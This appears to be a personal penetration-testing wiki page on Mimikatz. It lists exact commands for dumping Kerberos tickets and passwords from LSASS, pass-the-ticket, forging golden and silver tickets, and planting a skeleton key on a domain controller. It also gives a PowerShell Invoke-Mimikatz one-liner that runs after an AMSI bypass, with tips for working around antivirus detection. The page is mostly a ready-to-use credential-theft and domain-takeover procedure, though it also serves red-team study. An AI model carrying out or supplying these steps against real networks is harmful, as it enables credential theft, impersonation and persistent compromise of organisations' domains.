# Using Mimikatz

Mimikatz needs to be run with administrative privileges (on the local machine), and provides its own command prompt. Use the `privilege::debug` command to check if you're running with the right privileges.

## Dumping Tickets

Mimikatz can dump ticket granting tickets (and session keys) from the memory of Windows' Local Security Authority Subsystem Service (LSASS); these can then be used to for privilege elevation or lateral movement (depending on which users are active on that machine).

Use the `sekurlsa::tickets /export` command to dump any Kerberos "tickets" (really ticket + session key data structures) from LSASS's memory as .kirbi files. Tickets are named like ID-USER-SERVICE-DOMAIN.kirbi; ticket granting tickets have a `krbtgt` SERVICE name. If you can find a `krbtgt` ticket belonging to an administrator account, then you've (almost) struck gold.

* [Kerberos](./Kerberos.md)

## Pass the Ticket Attacks

Use the `kerberos::ptt TICKET_FILE` command to load the data structure in the specified .kirbi file into memory (allowing the account you're logged in as to "pass the ticket" and impersonate the user whose ticket you've harvested).

## Golden/Silver Ticket Attacks

To generate a gold or silver ticket using Mimikatz, begin by running the `lsadump::lsa /inject /name:SERVICE` command to retrieve the service SID and NTLM password hash for that service. If SERVICE is `krbtgt` then this will allow the creation of a golden ticket, otherwise you'll be creating a silver ticket.

(You can also use a user name instead of SERVICE, in which case it appears that Mimikatz will just request a ticket granting ticket from the KDC as that user in the next step; this is theoretically just as noisy as a golden ticket, but looks more "normal".)

To actually create and cache the ticket, use `Kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /id:TYPE`, where:

* `USER` is the user to create the ticket for (probably the one you've compromised).
* `DOMAIN` is the domain to create the ticket for.
* `SID` is the SID of the service from the previous step.
* `HASH` is the NT hash of the service password from the previous step.
* `TYPE` is the type of Kerberos ticket to create; use 500 for a golden (ticket granting) ticket, and 1103 for a service ticket.

Once the ticket has been created, use `misc::cmd` to open a command prompt using the newly forged ticket.

* [Windows Password Hashes](./Windows%20Password%20Hashes.md)

## KDC Skeleton Key

If Mimikatz is run on a domain controller, it can modify the authentication service's memory using the `misc::skeleton` command to cause it to attempt to decrypt the AS-REQ using *both* the user's NT hash *and* an NT hash of your choosing (by default `60BA4FCADC466C7A033C178194C03DF6`, which is just `mimikatz`).  This means that you can send an AS-REQ as any user using the "skeleton key" hash to gain access as that user, similar to a golden ticket attack.

Obviously this isn't very persistent itself, as the skeleton key will be lost if the server is rebooted or the authentication service restarted.

## Pure PowerShell Implementation

Mimikatz binaries are generally detected by AV on download these days, but fortunately there's a PowerShell reimplementation available from the Empire Project that can be run after bypassing AMSI.

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"' > C:\mkat.txt
```

Note that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.

* [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
* [EmpireProject / Empire / data / module_source / credentials / Invoke-Mimikatz.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1)
* [Using PowerShell](./Using%20PowerShell.md)
